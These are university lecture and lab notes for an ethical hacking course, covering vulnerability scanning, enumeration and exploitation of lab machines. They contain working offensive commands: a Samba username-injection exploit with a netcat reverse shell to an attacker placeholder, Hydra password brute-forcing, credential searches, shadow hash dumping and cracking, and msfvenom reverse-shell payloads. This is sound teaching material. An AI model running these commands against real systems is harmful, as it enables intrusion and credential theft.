# Week 5 — Exploitation: Protocol & OS

> **Module:** UOP M31880 Ethical Hacking
> **Lecturer:** Tobi Fajana
> **Topic:** Exploitation — Protocol & OS System Enumeration

---

## Table of Contents

1. [Vulnerability Scanning](#1-vulnerability-scanning)
2. [Vulnerability Scanners & Tools](#2-vulnerability-scanners--tools)
3. [Key Concepts — Payloads, Shells & Modules](#3-key-concepts--payloads-shells--modules)
4. [Vulnerability Identification Methodology](#4-vulnerability-identification-methodology)
5. [Vulnerability Assessment & Prioritisation](#5-vulnerability-assessment--prioritisation)
6. [Picking Your Exploit](#6-picking-your-exploit)
7. [Exploitation Targets](#7-exploitation-targets)
8. [Shellcode Deep Dive](#8-shellcode-deep-dive)
9. [Lab — Environment Setup](#9-lab--environment-setup)
10. [Lab — Documentation & Scanning](#10-lab--documentation--scanning)
11. [Lab — Banner Grabbing & Password Discovery](#11-lab--banner-grabbing--password-discovery)
12. [Lab — Service Enumeration & Username Discovery](#12-lab--service-enumeration--username-discovery)
13. [Lab — Password Attacks with Hydra](#13-lab--password-attacks-with-hydra)
14. [Lab — SMB Enumeration & Exploitation](#14-lab--smb-enumeration--exploitation)
15. [Lab — Post Exploitation & Hash Dumping](#15-lab--post-exploitation--hash-dumping)
16. [Lab — Windows Task](#16-lab--windows-task)
17. [Cheat Sheet](#17-cheat-sheet)
18. [Recommended Reading](#18-recommended-reading)

---

## 1. Vulnerability Scanning

Vulnerability scanning is a systematic approach to finding weaknesses:

| Activity | Purpose |
|---|---|
| **Port scanning** | Discover open ports and running services |
| **Banner grabbing** | Identify software versions from service responses |
| **Directory scanning** | Find hidden files, directories, and endpoints |
| **Misconfiguration checks** | Detect default credentials, open shares, weak permissions |
| **Version checking** | Compare detected versions against vulnerability databases |
| **Subtle testing** | Probe for weaknesses without triggering alarms |

> **Key Point:** Vulnerability scanning automates what would otherwise be a tedious manual process — checking every discovered service against known vulnerability databases.

### The Reality

In corporate environments, defenders typically deploy:
- Patch management systems
- End-user protection (AV, EDR)
- Intrusion Detection Systems (IDS)
- Intrusion Prevention Systems (IPS)

This means exploitation isn't always straightforward — you need to understand what defences are in place and adapt your approach.

---

## 2. Vulnerability Scanners & Tools

### Vulnerability Scanners

| Scanner | Type | Best For |
|---|---|---|
| **Nikto** | Free | Quick, basic HTTP vulnerability scanning |
| **Nmap** | Free | Port scanning + vuln scripts (`--script=vuln`) |
| **OpenVAS** | Free / Open Source | Centralised, regularly updated, full vulnerability management |
| **Metasploit** | Free / Pro | Scanning AND exploitation in one framework |
| **OWASP ZAP** | Free | Web application security scanning |
| **Nessus** | Commercial | Extensive OS/infrastructure scanning including cloud |
| **Nexpose** | Commercial | Enterprise vulnerability management |
| **Qualys / Tenable** | Commercial | Enterprise-grade scanning platforms |

### Supporting Tools

| Category | Tools |
|---|---|
| **CMS Scanning** | WPScan, Joomscan |
| **Directory Scanning** | DirBuster, Gobuster |
| **Proxies** | Burp Suite, TamperChrome |
| **Enumeration** | enum4linux, DNSEnum, SNMPwalk, smtp-user-enum, smbmap |
| **Fuzzing** | Various tools in Kali Linux menu |
| **Stress Testing** | Various tools in Kali Linux menu |

---

## 3. Key Concepts — Payloads, Shells & Modules

### Metasploit Module Types

| Module Type | Description | Sends Payload? |
|---|---|---|
| **Auxiliary** | Port scanners, fuzzers, sniffers, enumeration tools | No |
| **Exploit** | Modules that deliver and execute payloads on targets | Yes |

### Payload Types

| Term | Definition |
|---|---|
| **Payload** | Code that runs on the victim after exploitation (shells, malware, keyloggers, backdoors, RATs) |
| **Non-Staged (Singles)** | A single, self-contained payload sent all at once |
| **Staged** | Two-part payload: a small stager first, then the full payload |
| **Stager** | Establishes a communication channel, then downloads and executes the stage payload |
| **Meterpreter** | A two-staged, advanced payload with extensive post-exploitation features |
| **Dynamic Payloads** | Generate unique payloads each time — helps evade anti-malware |
| **Static Payloads** | Fixed IP/port for communication between attacker and victim |

### Shell Types

| Term | Definition |
|---|---|
| **Shell** | A user interface for running commands (e.g., `/bin/bash`, `cmd.exe`) |
| **Shellcode** | A payload whose primary purpose is to start a shell; injected into input |
| **Bind Shell** | Opens a port on the victim and listens for the attacker to connect |
| **Reverse Shell** | Victim initiates a connection back to the attacker's listener |

### Other Key Terms

| Term | Definition |
|---|---|
| **Encoders** | Ensure payloads arrive at the destination intact (bypass bad character filtering) |
| **NOPs** | Keep payload sizes consistent across exploit attempts (NOP sled) |

---

## 4. Vulnerability Identification Methodology

```
┌──────────────────────────────┐
│  1. Find Injection Points    │  OSINT, Google Dorking, port scanning,
│                              │  enumeration, directory scanning, API scanning
├──────────────────────────────┤
│  2. Fuzzing                  │  Send unexpected/random data to find crashes
│                              │  or unexpected behaviour
├──────────────────────────────┤
│  3. Testing                  │  Validate suspected vulnerabilities
│                              │  with controlled inputs
├──────────────────────────────┤
│  4. Exploit                  │  Develop or use existing exploit to
│                              │  confirm the vulnerability
└──────────────────────────────┘
```

---

## 5. Vulnerability Assessment & Prioritisation

After finding vulnerabilities, you need to assess and prioritise them:

| Factor | Key Questions |
|---|---|
| **Risk** | What is the probability of exploitation? |
| **Exploit** | Who can exploit it? How complex is it? Is there a CVE? Is it a zero-day? |
| **Impact** | What is the business impact? Cost to the business? Cost of repair? |
| **Threats** | What is the attacker's ability/motivation? |
| **Metrics** | NIST CVSS severity score, NIST SP 800-30 risk assessment |
| **Management** | What are the recommendations? How to patch/manage? |

### Vulnerability Assessment Criteria

| Criterion | Description |
|---|---|
| Risk of exploitation | How likely is this to be exploited in the wild? |
| Ease/Complexity | How difficult is it to exploit? |
| Impact | What happens if it's exploited? |
| Cost | What's the financial/operational cost? |
| Remediation | How to fix it? Follow standards like NIST CVSS or MITRE CWSS |

---

## 6. Picking Your Exploit

When multiple vulnerabilities exist, choose based on:

| Factor | Consideration |
|---|---|
| **Reliability** | Some vulnerabilities can only be attempted once — a failed attempt may crash the service |
| **Complexity** | How easy is it? Does it require specialist knowledge? |
| **Impact** | Which gives the highest damage? Which breaches CIA (Confidentiality, Integrity, Availability)? |
| **Detection** | Risk of being detected — do you need stealth? |
| **Environment** | What programming language/tool is needed? Any specific conditions or protocols? |
| **Cost** | Financial cost, time investment, and effort required |

---

## 7. Exploitation Targets

| Attack Vector | Examples |
|---|---|
| **Malware** | Virus, Worm, Trojan |
| **Backdoor** | Insider threat, hidden program, chain of custody, rootkits |
| **Public-facing** | Vulnerable protocols, vulnerable applications |
| **Internal** | Lateral movement within network, privilege escalation, access restricted areas |
| **Wireless** | Network sniffing, evil twin, deauth attacks |
| **Physical** | Weak or no access control, USB drops |

---

## 8. Shellcode Deep Dive

### What Is Shellcode?

- A set of instructions executed **after** an exploit succeeds
- Primary purpose: give the attacker a **shell** (CLI or GUI)
- Usually injected within user input or buffer overflows
- Can be written in **any** programming language

### Why Assembly?

Shellcode is commonly written in Assembly because:

| Reason | Explanation |
|---|---|
| **Direct memory access** | Essential for memory corruption vulnerabilities |
| **Register manipulation** | Directly controls CPU registers and program functions |
| **Small size** | Fits within limited buffer sizes |
| **Clean execution** | High-level languages may not execute cleanly in constrained environments |
| **No dependencies** | Avoids issues with unavailable functions/modules |

### Challenges

- **Bad characters** — Certain bytes (like `\x00` null) break the exploit; shellcode must avoid them
- **Buffer size limits** — Shellcode must fit within the available space
- **Unavailable functions** — Target may not have expected libraries/modules

---

## 9. Lab — Environment Setup

### Machines Required

| Machine | Role | Source |
|---|---|---|
| **Attackbox** (osboxes) | Attacker | osboxes.org |
| **EH Machine** | Target (WordPress) | Moodle |
| **Metasploitable2** | Target (Linux) | [SourceForge](http://sourceforge.net/projects/metasploitable/files/Metasploitable2/) |
| **Frozen-Windows** | Target (Windows) | Provided |

### Network Configuration

All machines need:
- **Adapter 1:** NAT
- **Adapter 2:** Host-only (`vboxnet0`)

Create `vboxnet0` if needed: **Tools → Network Manager → Host-only networks → Create**

### Credentials & Setup

```bash
# Attackbox login
osboxes.org:osboxes.org

# Change username to your student ID (for screenshots)
sudo usermod -l <student-id> osboxes

# Install tools
sudo apt update && sudo apt install nmap ncat gobuster enum4linux

# Verify connectivity
nmap -sV -T5 192.168.56.1/24
```

---

## 10. Lab — Documentation & Scanning

### The Playbook Concept

A **playbook** is a methodical set of guidelines for achieving your assessment objectives. Good documentation includes:

- User details, device info, network details
- Confidential information gathered during assessment
- Data in formats that can be processed by other tools
- Minimal footprint on the target network

### Nmap Output Formats

```bash
# Normal output (readable text file)
nmap -oN top-ports-scan.txt 192.168.56.1/24

# Grepable output (for scripting/filtering)
nmap -oG scan-results.txt 192.168.56.1/24

# XML output (opens in Excel, importable to other tools)
# Full scan: all ports + vulnerability scripts
nmap -oX all-ports-scan.xml 192.168.56.1/24 -p- --script=vuln
```

> **Note:** The full vulnerability scan (`-p- --script=vuln`) takes a long time. Start it in one terminal and continue working in another.

---

## 11. Lab — Banner Grabbing & Password Discovery

### Banner Grabbing Unknown Services

When scanning all ports, you may find unknown services:

```bash
# Full port scan reveals port 6464 on the EH machine
nmap -sV -p- 192.168.56.101

# Connect to the unknown service
nc 192.168.56.101 6464
# It asks for a password!
```

### Finding Passwords on a Compromised System

After gaining initial access (via command injection, plugin exploit, or phishing), search for credentials:

```bash
# Find configuration files (often contain passwords)
find / -name "*config*" 2>/dev/null

# Find files with "password" in the name
find / -name "*Passw*" 2>/dev/null

# Find scripts in home directories
find /home -name "*.sh*" 2>/dev/null
```

Common places where passwords hide:
- `wp-config.php` — WordPress database credentials
- `old-config.php` — Forgotten backup config files
- Shell scripts in home directories
- `.bash_history` files

> **Task:** If you find a password, try it on the backdoor service (port 6464). Password reuse is extremely common.

### Advanced Exercise

Write a script to brute-force port 6464 — test different usernames and passwords, only printing output when a match is found.

---

## 12. Lab — Service Enumeration & Username Discovery

### Telnet Username Enumeration

Telnet often reveals whether a username exists based on the error response:

```bash
telnet 192.168.56.126
```

| Response | Meaning |
|---|---|
| `Login incorrect` | Username does **not** exist |
| Asks for password | Username **exists** |

This difference lets you enumerate valid usernames without needing passwords.

### Building a Username List

```bash
# Create a file with potential usernames
echo -e "admin\nmaintenance\nroot\nadministrator\njohn" >> users.txt
```

**Explanation:**
- `echo` — output text
- `-e` — enable escape sequences (like `\n`)
- `\n` — newline (each username on its own line)
- `>>` — append to file (don't overwrite)

---

## 13. Lab — Password Attacks with Hydra

**Hydra** is a fast, flexible network login cracker supporting many protocols.

### Setup

```bash
# Download the rockyou password list (14 million+ passwords)
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```

### Attacking Telnet

```bash
hydra -L users.txt -P rockyou.txt 192.168.56.126 telnet
```

### Attacking SSH

```bash
hydra -L users.txt -P rockyou.txt 192.168.56.126 ssh
```

### Hydra Options

| Flag | Description |
|---|---|
| `-L <file>` | Username list file |
| `-l <user>` | Single username |
| `-P <file>` | Password list file |
| `-p <pass>` | Single password |
| `-t <n>` | Number of parallel threads |
| `-V` | Verbose — show every attempt |
| `-f` | Stop after first valid login found |

---

## 14. Lab — SMB Enumeration & Exploitation

### What Is SMB?

**Server Message Block (SMB)** is a protocol for sharing files, printers, and other resources between computers. Typically runs on **ports 139 and 445**.

### SMB Security Levels

| Level | Description |
|---|---|
| **Share Level** | One password per share — anyone with the password accesses all files |
| **User Level** | Per-user authentication — users must log in and get a UID |

### SMB Scanning with Nmap

```bash
# List all SMB-related nmap scripts
ls -l /usr/share/nmap/scripts/smb*

# OS discovery via SMB
nmap -v -p 139,445 --script=smb-os-discovery 192.168.56.101

# Scan for SMB vulnerabilities
nmap -p 139,445 --script=smb-vuln* 192.168.56.101
```

### Enumeration with enum4linux

```bash
# Install
sudo apt install enum4linux

# Full enumeration (users, shares, OS, groups)
enum4linux -a 192.168.56.101
```

This reveals:
- Samba version
- Usernames (reduces brute-force time massively)
- Share names and permissions
- OS information

### Exploiting Samba (CVE-2007-2447)

This classic vulnerability allows **arbitrary command execution** through unsanitised usernames in Samba 3.0.x:

**How it works:**

```python
# The exploit injects shell commands via the username field
username = "/=`nohup " + payload + "`"
conn = SMBConnection(username, "", "", "")
conn.connect(rhost, int(rport))
```

The payload creates a reverse shell:
```bash
mkfifo /tmp/hago;                    # Create a named pipe
nc <attacker-ip> <port> 0</tmp/hago  # Connect back to attacker
| /bin/sh >/tmp/hago 2>&1;           # Redirect shell I/O through pipe
rm /tmp/hago                         # Clean up
```

**Exploitation with Metasploit:**

```bash
msfconsole

use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.101
exploit

# You should get a shell
whoami
# root

# Background the session (don't close it!)
# Press Ctrl+Z or type 'bg' in meterpreter
```

### Finding Known Vulnerabilities

```bash
# Search for Samba exploits
searchsploit samba 3.0
```

Full exploit code: [CVE-2007-2447 on GitHub](https://github.com/amriunix/CVE-2007-2447)

---

## 15. Lab — Post Exploitation & Hash Dumping

After gaining access, extract password hashes for offline cracking:

```bash
# In msfconsole (with an active session)
use post/linux/gather/hashdump
set SESSION 1
run
```

This dumps `/etc/shadow` entries which can be cracked with tools like:
- **John the Ripper:** `john --wordlist=rockyou.txt hashes.txt`
- **Hashcat:** `hashcat -m 1800 hashes.txt rockyou.txt`

---

## 16. Lab — Windows Task

Download and set up the **frozen-windows** machine. Find 3–5 vulnerabilities and document them:

| Field | Example |
|---|---|
| **CVE/CWE** | CVE-2017-0144 |
| **Risk / CVSS** | High / 8.8 |
| **Tools** | Metasploit |
| **Description** | [What the vulnerability is] |
| **Impact** | [What an attacker can achieve] |
| **Recommendation** | Update Windows to latest version; implement regular pentesting |

> **Tip:** Start with `nmap --script=vuln` against the Windows target to find known CVEs, then research each one.

---

## 17. Cheat Sheet

### Scanning & Enumeration

```bash
# === Nmap Scanning ===
nmap -sV -T5 192.168.56.1/24              # Quick service scan
nmap -A <ip> -p-                           # All ports + OS detection
nmap -oN results.txt <ip>                  # Output to text file
nmap -oX results.xml <ip> -p- --script=vuln  # XML + vuln scan
nmap -p 139,445 --script=smb-vuln* <ip>   # SMB vulnerability scan
nmap --script=smb-os-discovery <ip>        # SMB OS detection

# === Banner Grabbing ===
nc <ip> <port>                             # Connect to unknown service

# === Enumeration ===
enum4linux -a <ip>                         # Full SMB/Samba enumeration
searchsploit <service> <version>           # Search for known exploits
```

### Username Discovery

```bash
# === Telnet Enumeration ===
telnet <ip>                                # Test usernames manually
# "Login incorrect" = user doesn't exist
# Asks for password  = user EXISTS

# === Build Username List ===
echo -e "admin\nroot\nuser" >> users.txt
```

### Password Attacks

```bash
# === Hydra ===
hydra -L users.txt -P rockyou.txt <ip> telnet
hydra -L users.txt -P rockyou.txt <ip> ssh
hydra -l admin -P rockyou.txt <ip> http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=incorrect"

# === Password File Locations ===
find / -name "*config*" 2>/dev/null
find / -name "*Passw*" 2>/dev/null
find /home -name "*.sh*" 2>/dev/null
```

### SMB/Samba Exploitation

```bash
# === Metasploit — Samba usermap_script ===
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS <target-ip>
exploit

# === Post Exploitation — Hash Dump ===
use post/linux/gather/hashdump
set SESSION 1
run
```

### Payload Generation

```bash
# === MSFvenom ===
# Linux ELF
msfvenom -p linux/x64/meterpreter_reverse_tcp \
  LHOST=<ip> LPORT=<port> -f elf > shell.elf

# PHP
msfvenom -p php/meterpreter_reverse_tcp \
  LHOST=<ip> LPORT=<port> -f raw > shell.php

# Windows EXE
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<ip> LPORT=<port> -f exe > shell.exe
```

### Key Metasploit Concepts

```
Auxiliary   → Scanning/enumeration (no payload)
Exploit     → Delivers a payload to the target
Payload     → Code that runs on the victim
  ├─ Singles    → Self-contained (non-staged)
  ├─ Staged    → Stager + Stage (e.g., Meterpreter)
  └─ Dynamic   → Unique each time (AV evasion)
Shellcode   → Payload that starts a shell
Encoder     → Ensures payload arrives intact
NOP         → Keeps payload sizes consistent
```

### Vulnerability Assessment Checklist

- [ ] All ports scanned (`-p-`)
- [ ] Service versions identified (`-sV`)
- [ ] Vulnerability scripts run (`--script=vuln`)
- [ ] Unknown services banner-grabbed
- [ ] SMB shares enumerated
- [ ] Usernames discovered
- [ ] Password attacks attempted
- [ ] Found passwords tested for reuse
- [ ] Exploits researched (searchsploit)
- [ ] Post-exploitation hash dump completed
- [ ] Findings documented with CVE/CVSS

---

## 18. Recommended Reading

- **Exploiting Software: How To Break Code** — Gary McGraw & Greg Hoglund
- **Sockets, Shellcode, Porting, and Coding** — James C. Foster
- **The Hacker Playbook 3: Practical Guide to Penetration Testing** — Peter Kim

---

*Week 5 of 12 — UOP M31880 Ethical Hacking*
